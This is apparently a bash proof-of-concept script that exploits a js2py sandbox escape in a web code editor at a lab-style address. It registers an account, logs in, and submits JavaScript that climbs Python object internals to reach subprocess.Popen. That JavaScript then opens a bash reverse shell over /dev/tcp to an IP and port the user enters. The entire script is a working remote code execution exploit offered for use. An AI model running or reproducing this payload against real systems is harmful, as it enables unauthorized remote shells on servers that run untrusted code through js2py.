#!/bin/bash
#author 0xmr
#this poc will descibe the  js2py module attack on the code editor.

# Print registration prompt
echo -e "It's time to register\n"
echo "Please enter the username:"
read username

# Prompt for password
echo "Setup the password:"
read  pass    # -s flag to hide the password

# Register the user
resp=$(curl -s -o /dev/null -w "%{http_code}" "http://10.10.11.82:8000/register" \
       --data "username=$username&password=$pass")

if [ "$resp" -eq 302 ]; then
  echo "[+] You are registered with username=$username"
else
  echo "Registration failed (HTTP $resp)"
  exit 1  # Exit if registration fails
fi

# Print login prompt
echo "[+] Logging in..."

repo=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://10.10.11.82:8000/login" \
       --data "username=$username&password=$pass" -c cookie_jar.txt)  

if [ "$repo" -eq 302 ]; then
  echo "[+] You are logged in"
else
  echo "Login failed (HTTP $repo)"
  exit 1  # Exit if login fails
fi

# Accessing profile page
echo -e "\n[+] Accessing profile page..."
curl -s  -o /dev/null -b cookie_jar.txt "http://10.10.11.82:8000/Dashboard"   

# Prompt for IP address and port
echo "Enter the IP address:"
read ip
echo "Enter your listening port:"
read port 

# Crafting payload
echo "[+] Crafting payload..."
payload=$(cat <<EOF
{
  "code": "// Bash reverse shell\nvar hacked = Object.getOwnPropertyNames({});\nvar attr = hacked.__getattribute__;\nvar obj = attr(\"__getattribute__\")(\"__class__\").__base__;\n\nfunction findPopen(o) {\n    try {\n        var subs = o.__subclasses__();\n        for (var i = 0; i < subs.length; i++) {\n            var item = subs[i];\n            if (item && item.__module__ === \"subprocess\" && item.__name__ === \"Popen\") {\n                return item;\n            }\n        }\n    } catch(e) {}\n    return null;\n}\n\nvar Popen = findPopen(obj);\nif (Popen) {\n    var cmd = \"bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\";\n    Popen(cmd, -1, null, -1, -1, -1, null, null, true);\n}"
}
EOF
)

# Sending the payload with headers
respo=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://10.10.11.82:8000/run_code" \
       --data "$payload" \
       -H "Content-Type: application/json" \
       -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" \
       -H "Accept: */*" \
       -H "Origin: http://10.10.11.82:8000" \
       -H "Referer: http://10.10.11.82:8000/dashboard" \
       -b cookie_jar.txt)  # Use the cookie jar for the request

# Check for success based on the expected response code
if [ "$respo" -eq 200 ]; then  # Change this to 200 if that's the expected success code
  echo "[+] Payload is uploaded"
else
  echo "Payload failed (HTTP $respo)"
fi

